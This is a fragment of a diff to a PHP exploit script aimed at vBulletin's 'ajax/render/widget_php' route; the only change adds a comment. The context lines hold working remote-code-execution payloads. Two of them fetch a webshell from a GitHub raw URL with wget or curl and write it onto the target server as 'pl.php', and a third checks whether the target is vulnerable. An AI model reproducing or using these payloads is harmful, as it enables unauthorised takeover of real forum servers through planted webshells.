@@ -23,7 +23,7 @@ $bl = "\033[0;34m";
 $gr = "\033[0;32m";
 $re = "\033[0;31m";
 $wh = "\033[1;37m";
-$shellname = "pl.php";
+$shellname = "pl.php"; // setting uploader name
 $payloadV = "routestring=ajax/render/widget_php&widgetConfig[code]=echo 'rintod'; exit;";
 $payloadS = 'routestring=ajax/render/widget_php&widgetConfig[code]=$c = popen("wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O '.$shellname.'"); echo fread($c, 1024); exit;';
 $payloadB = 'routestring=ajax/render/widget_php&widgetConfig[code]=$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/rintod/toolol/master/payload.php"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $ajg = curl_exec($ch);$f=fopen("'.$shellname.'", "a+");fwrite($f, $ajg);fclose($f);echo "rintod";exit;'; 
